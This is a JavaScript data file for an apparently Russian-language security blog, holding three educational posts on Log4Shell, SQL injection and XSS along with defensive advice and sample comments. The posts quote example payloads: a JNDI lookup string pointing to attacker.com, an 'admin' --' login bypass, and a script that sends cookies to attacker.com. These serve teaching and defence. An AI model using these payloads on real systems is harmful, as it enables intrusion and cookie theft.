// Posts data
const postsData = [
    {
        id: "1",
        title: "Критическая уязвимость в Log4j: CVE-2021-44228",
        excerpt: "Анализ одной из самых опасных уязвимостей в истории Java-экосистемы. Как защитить свои системы от Log4Shell.",
        content: `<h2>Обзор уязвимости</h2>
<p>Log4Shell (CVE-2021-44228) — это критическая уязвимость удалённого выполнения кода (RCE) в популярной библиотеке логирования Apache Log4j 2. Уязвимость получила максимальную оценку CVSS 10.0.</p>

<h3>Как работает атака</h3>
<p>Злоумышленник может выполнить произвольный код на сервере, отправив специально сформированную строку, которая будет записана в лог. Библиотека Log4j 2 поддерживает функцию lookup, которая позволяет подставлять значения из различных источников.</p>

<pre><code>\${jndi:ldap://attacker.com/exploit}</code></pre>

<h3>Рекомендации по защите</h3>
<ol>
    <li><strong>Обновите Log4j</strong> до версии 2.17.0 или выше</li>
    <li>Установите флаг <code>log4j2.formatMsgNoLookups=true</code></li>
    <li>Удалите класс JndiLookup из classpath</li>
    <li>Используйте WAF для блокировки вредоносных паттернов</li>
</ol>

<h3>Заключение</h3>
<p>Эта уязвимость затронула миллионы систем по всему миру и показала, насколько важно следить за безопасностью зависимостей.</p>`,
        image: "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=800&h=400&fit=crop",
        cvss: 10.0,
        cve: "CVE-2021-44228",
        date: "15 января 2024",
        author: "Security Team",
        tags: ["RCE", "Java", "Log4j", "Critical"]
    },
    {
        id: "2",
        title: "SQL-инъекции: классика кибератак",
        excerpt: "Подробный разбор техник SQL-инъекций и методов защиты веб-приложений от этого типа атак.",
        content: `<h2>Что такое SQL-инъекция?</h2>
<p>SQL-инъекция — это техника внедрения вредоносного SQL-кода в запросы к базе данных. Это одна из самых распространённых и опасных уязвимостей веб-приложений.</p>

<h3>Пример уязвимого кода</h3>
<pre><code>SELECT * FROM users WHERE username = '$username' AND password = '$password'</code></pre>

<p>При вводе <code>admin' --</code> в поле username злоумышленник может обойти аутентификацию.</p>

<h3>Типы SQL-инъекций</h3>
<ul>
    <li><strong>Union-based</strong> — использование UNION для извлечения данных</li>
    <li><strong>Boolean-based</strong> — определение структуры БД через true/false ответы</li>
    <li><strong>Time-based</strong> — анализ времени ответа сервера</li>
    <li><strong>Error-based</strong> — извлечение информации из сообщений об ошибках</li>
</ul>

<h3>Защита</h3>
<ol>
    <li>Используйте параметризованные запросы</li>
    <li>Применяйте ORM</li>
    <li>Валидируйте входные данные</li>
    <li>Ограничивайте привилегии БД</li>
</ol>`,
        image: "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop",
        cvss: 7.5,
        cve: "CWE-89",
        date: "10 января 2024",
        author: "Security Team",
        tags: ["SQL", "Web", "Injection", "Database"]
    },
    {
        id: "3",
        title: "XSS атаки: защита пользователей",
        excerpt: "Cross-Site Scripting остаётся одной из главных угроз для веб-приложений. Разбираем типы XSS и методы защиты.",
        content: `<h2>Введение в XSS</h2>
<p>Cross-Site Scripting (XSS) — это тип атаки, при которой злоумышленник внедряет вредоносные скрипты в веб-страницы, просматриваемые другими пользователями.</p>

<h3>Типы XSS</h3>

<h4>Stored XSS (Хранимая)</h4>
<p>Вредоносный скрипт сохраняется на сервере и выполняется при каждом посещении страницы.</p>

<h4>Reflected XSS (Отражённая)</h4>
<p>Скрипт отражается от веб-сервера в ответ на запрос пользователя.</p>

<h4>DOM-based XSS</h4>
<p>Атака происходит полностью на стороне клиента, без участия сервера.</p>

<h3>Пример атаки</h3>
<pre><code>&lt;script&gt;document.location='http://attacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code></pre>

<h3>Методы защиты</h3>
<ol>
    <li><strong>Content Security Policy (CSP)</strong></li>
    <li><strong>HttpOnly cookies</strong></li>
    <li><strong>Экранирование выходных данных</strong></li>
    <li><strong>Валидация входных данных</strong></li>
</ol>`,
        image: "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?w=800&h=400&fit=crop",
        cvss: 6.1,
        cve: "CWE-79",
        date: "5 января 2024",
        author: "Security Team",
        tags: ["XSS", "Web", "JavaScript", "Browser"]
    }
];

// Comments data (stored in localStorage)
function getComments() {
    const stored = localStorage.getItem('blog_comments');
    if (stored) {
        return JSON.parse(stored);
    }
    return [
        {
            id: "1",
            postId: "1",
            author: "CyberDefender",
            content: "Отличный разбор! Log4Shell действительно стал переломным моментом в осознании важности безопасности зависимостей.",
            date: "16 января 2024"
        },
        {
            id: "2",
            postId: "1",
            author: "DevSecOps",
            content: "Рекомендую также добавить мониторинг с помощью SIEM для обнаружения попыток эксплуатации.",
            date: "17 января 2024"
        },
        {
            id: "3",
            postId: "2",
            author: "WebDeveloper",
            content: "Параметризованные запросы — это must-have. Удивительно, что до сих пор встречаются уязвимые приложения.",
            date: "11 января 2024"
        }
    ];
}

function saveComments(comments) {
    localStorage.setItem('blog_comments', JSON.stringify(comments));
}

function getCvssClass(cvss) {
    if (cvss >= 9.0) return "cvss-critical";
    if (cvss >= 7.0) return "cvss-high";
    if (cvss >= 4.0) return "cvss-medium";
    if (cvss > 0) return "cvss-low";
    return "";
}
